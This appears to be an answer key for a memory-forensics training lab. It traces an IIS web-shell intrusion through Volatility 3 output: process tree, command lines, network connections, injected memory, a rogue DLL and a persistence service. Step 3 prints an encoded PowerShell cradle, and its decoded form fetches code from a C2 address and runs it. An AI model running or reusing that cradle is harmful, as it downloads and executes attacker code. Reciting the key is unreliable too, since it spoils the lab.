# Lab 07 — Hands-On Walkthrough Sample Answers

*Sample answers for the Hands-On Walkthrough section of `Labs/Lab07/ReadMe.md`. These are reference answers — your filter, your environment, and your tool version may legitimately produce slightly different values. The interpretation matters more than the exact number.*

> **Note:** The data in `Data/WEB-APP-03/` is pre-formatted text output from Volatility 3 plugins (`windows.info`, `windows.pstree`, `windows.cmdline`, `windows.netscan`, `windows.malfind`, `windows.dlllist`, `windows.svcscan`, `windows.handles`). The expected outputs below were verified by `grep` against those text files. If you have the source memory image, running the equivalent Volatility 3 plugin against it should produce the same content. MemProcFS users would see the same data exposed as files under `M:\`.

---

## Step 1 — Confirm the image is parsable (`windows.info`)

**Expected output:** Standard `windows.info` output showing `ProductName=Windows Server 2019 Datacenter`, `NtBuildNumber=17763`, `NtBuildLab=17763.1.amd64fre.rs5_release.180914-1434`, `Major/Minor=15.17763`, `layer_name=0 WindowsIntel32e` (x64), and a `Kernel Base` of `0xf8042b400000`. System architecture and KdDebuggerDataBlock are present.

**Verified via:** `grep -E "ProductName|NtBuildNumber|layer_name|Kernel Base" Data/WEB-APP-03/volatility-info.txt`

**Interpretation:** This is the sanity check that proves the image was parsed correctly. `ProductName`, the kernel base, and a populated layer name mean Volatility could resolve the symbol table for this build. If `windows.info` had failed in a real investigation, every subsequent plugin would have failed too. Documenting the OS build (Server 2019, 17763) also bounds which symbol packages and which Volatility version this analysis used.

---

## Step 2 — Walk the process tree (`pstree`)

**Expected output:** The indented `pstree` output shows the suspicious chain rooted at `wininit.exe (524)` -> `services.exe (596)` -> `WAS.exe (2712)` -> `w3wp.exe (PID 2860, started 2024-11-21 09:00:14)` -> `cmd.exe (PID 3580, started 2024-11-21 10:18:42)` and -> `powershell.exe (PID 3704, started 2024-11-21 10:18:42)`.

**Verified via:** `grep -E "w3wp|cmd|powershell|wininit|services" Data/WEB-APP-03/volatility-pstree.txt`

**Interpretation:** The IIS worker `w3wp.exe` should never spawn a command shell or PowerShell under normal operation. This parent-child anomaly (`w3wp -> cmd, w3wp -> powershell`) is the central process-tree finding of the case and a textbook web-shell signature. Both children started in the same second (10:18:42), which is not a human-paced sequence.

---

## Step 3 — Read the suspicious command line

**Expected output:** **1 row** — PID 3704 (`powershell.exe`) with the command line below:

```
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcABzADoALwAvADkAMQAuADIAMQA0AC4ANAA3AC4AMgAyADoANAA0ADMALwBhAGcAZQBuAHQAJwAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAASQBFAFgA
```

Decoded base64 (UTF-16 LE): `Invoke-WebRequest -Uri 'https://91.214.47.22:443/agent' -UseBasicParsing | IEX`.

**Verified via:** `grep -E "powershell.exe|3704|EncodedCommand" Data/WEB-APP-03/volatility-cmdline.txt`

**Interpretation:** Three textbook PowerShell-abuse markers are stacked in one line: `-NoProfile`, `-WindowStyle Hidden`, `-EncodedCommand`. The decoded command pulls a payload from the C2 IP and pipes it directly into `IEX`, which makes it a fileless in-memory loader cradle. The same C2 IP (`91.214.47.22`) appears in the WKSTN-221 dataset, suggesting the same attacker across multiple hosts. The sibling `cmd.exe` (PID 3580) does not match the filter. Its command line is just `"cmd.exe"`, with no `/c` argument: an interactive shell driven over redirected input, so the commands run through it are not recoverable from `cmdline`.

---

## Step 4 — Identify active C2 (`netscan`)

**Expected output:** An established TCPv4 connection from PID 3704 powershell.exe at `10.0.8.34:49918` -> `91.214.47.22:443`, established at **2024-11-21 10:19:01 UTC**. The other eight ESTABLISHED connections fall into two groups. Five are outbound LDAP, Kerberos, and SMB to internal hosts `10.0.4.5` and `10.0.4.12`, owned by `lsass.exe` and `System`. Three are inbound web connections from `10.0.6.118` to local ports 80 and 443, owned by `System` (PID 4) because IIS receives requests through the HTTP.sys kernel driver. None of them go to the C2 destination.

**Verified via:** `grep -E "ESTABLISHED|powershell" Data/WEB-APP-03/volatility-netscan.txt`

**Interpretation:** This is the per-process attribution that pure network sources cannot produce. The OS-level socket table directly attributes the outbound C2 connection to the malicious PowerShell process, which started 19 seconds earlier. The 10.0.8.34 source IP corroborates that this host (WEB-APP-03) is the originator. The C2 IP shared with WKSTN-221 is a multi-host indicator if the case scope expands. The inbound connections from `10.0.6.118` opened between 10:14:09 and 10:17:55 UTC, shortly before the shells spawned at 10:18:42. Check that client against the IIS logs.

---

## Step 5 — Confirm injected code (`malfind`)

**Expected output:** **3 hits**:

| PID | Process | Range | Protection | Notes |
|---|---|---|---|---|
| 3704 | powershell.exe | 0x1f4a0000 – 0x1f5a0fff | PAGE_EXECUTE_READWRITE | 256 pages, MZ header at region start |
| 1142 | svchost.exe | 0x2b1c0000 – 0x2b1d3fff | PAGE_EXECUTE_READWRITE | 20 pages, MZ header at region start |
| 2860 | w3wp.exe | 0x000001b3a4ee0000 – 0x000001b3a4ef3fff | PAGE_EXECUTE_READWRITE | 20 pages, MZ header at region start |

**Verified via:** `grep -E "^[0-9]+\s+(powershell|svchost|w3wp)" Data/WEB-APP-03/volatility-malfind.txt`

**Interpretation:** All three hits are `PAGE_EXECUTE_READWRITE` private-memory regions with no backing file, the canonical reflective-loader and process-injection pattern. All three regions begin with the `MZ` PE header at offset 0, so each holds a PE image in memory with no file on disk. The PID 3704 region is the largest (256 pages, ~1 MiB). The svchost.exe (1142) hit lines up with the Process and Thread handles that PID 3704 holds into PID 1142 (Step 8). The w3wp.exe (2860) hit has no such handle tie-back in this dataset, so what placed it there is still open.

---

## Step 6 — Inspect loaded DLLs (`dlllist`)

**Expected output:** **1 row** matching the filter — `cmdshell.dll` loaded into PID 2860 (`w3wp.exe`) from `C:\Windows\Temp\cmdshell.dll`, load time 2024-11-21 10:19:14 UTC, size 0x18000.

**Verified via:** `grep -E "Temp\\\\|cmdshell" Data/WEB-APP-03/volatility-dlllist.txt`

**Interpretation:** A DLL loaded into IIS from `C:\Windows\Temp\` is essentially never legitimate, but it is not what spawned the shells. It loaded at 10:19:14, 32 seconds after `w3wp.exe` spawned `cmd.exe` and `powershell.exe` at 10:18:42 (Step 2), and 13 seconds after the C2 connection opened (Step 4). That timing is consistent with a C2-pulled payload being staged to disk and then loaded into the worker as follow-on activity. Because `dlllist` lists it, it went through the normal loader rather than reflective loading. This dataset does not show what first made the worker spawn shells. Compared with the on-disk-copy DLLs Windows ships, both the path and the load time are anomalous.

---

## Step 7 — Find the disappearing service (`svcscan`)

**Expected output:** **1 row** — service name `WindowsHealthCollector`, display name `Windows Health Collector Service`, `SERVICE_WIN32_OWN_PROCESS`, `SERVICE_DEMAND_START`, currently `SERVICE_STOPPED`, binary path `C:\Windows\Temp\whcs.exe`.

**Verified via:** `grep -E "WindowsHealthCollector|whcs" Data/WEB-APP-03/volatility-svcscan.txt`

**Interpretation:** A service registered with a binary in `C:\Windows\Temp\` follows the same Temp-directory persistence anti-pattern as the DLL in Step 6. The current state is `SERVICE_STOPPED`. The service is present in the service registry but not currently running, which is the "service that appeared and disappeared" in System.evtx that the WEB-APP-03 scenario describes. This is a defensible persistence-mechanism finding.

---

## Step 8 — Pull the suspicious process's handles (`handles`)

**Expected output:** Handles owned by PID 3704 (`powershell.exe`):

| Handle Type | Target |
|---|---|
| File | `\Device\HarddiskVolume2\Windows\Temp\cmdshell.dll` |
| File | `\Device\NamedPipe\whcs_ctrl` |
| File | `\Device\HarddiskVolume2\Windows\Temp\whcs.exe` |
| Process | `svchost.exe (1142)` |
| Thread | `svchost.exe (1142): 1146` |

**Verified via:** `grep -E "cmdshell|whcs|pipe" Data/WEB-APP-03/volatility-handles.txt` plus `grep "Process\|Thread" Data/WEB-APP-03/volatility-handles.txt | grep "1142"`

**Interpretation:** PowerShell holds open handles to `cmdshell.dll` (Step 6) and the persistence binary (Step 7), confirming both are in-flight rather than residual. The named pipe `\\.\pipe\whcs_ctrl` is a control channel between the loader and the service binary. The Process and Thread handles into PID 1142 confirm the injection target identified by `malfind` in Step 5. The `svchost.exe` malfind hit is not a coincidence, because powershell.exe has full-access (`0x1fffff`) handles into that exact PID and into its thread 1146. The handle data does not show what thread 1146 is executing. Tying it to the injected region at `0x2b1c0000` needs thread start-address data that this dataset does not include.

---

## Summary

Eight Volatility plugins, eight independent observations, one coherent picture:

| Plugin | Finding |
|---|---|
| `windows.info` | Image is Server 2019 17763, parsable |
| `windows.pstree` | `w3wp.exe -> cmd.exe + powershell.exe` (IIS-spawned shell — anomaly) |
| `windows.cmdline` | PowerShell with `-EncodedCommand` -> `IEX` cradle to 91.214.47.22 |
| `windows.netscan` | ESTABLISHED TCP/443 from PID 3704 to 91.214.47.22 |
| `windows.malfind` | RWX private memory in PIDs 3704, 1142, 2860; PE header in all three |
| `windows.dlllist` | `cmdshell.dll` loaded from `C:\Windows\Temp\` into w3wp.exe |
| `windows.svcscan` | `WindowsHealthCollector` service with `C:\Windows\Temp\whcs.exe` binary |
| `windows.handles` | PowerShell holds Process+Thread handles into svchost.exe (1142) — injection target confirmed |

The findings on this host share the C2 IP `91.214.47.22` with the WKSTN-221 dataset. Note that as a multi-host indicator if the case expands.
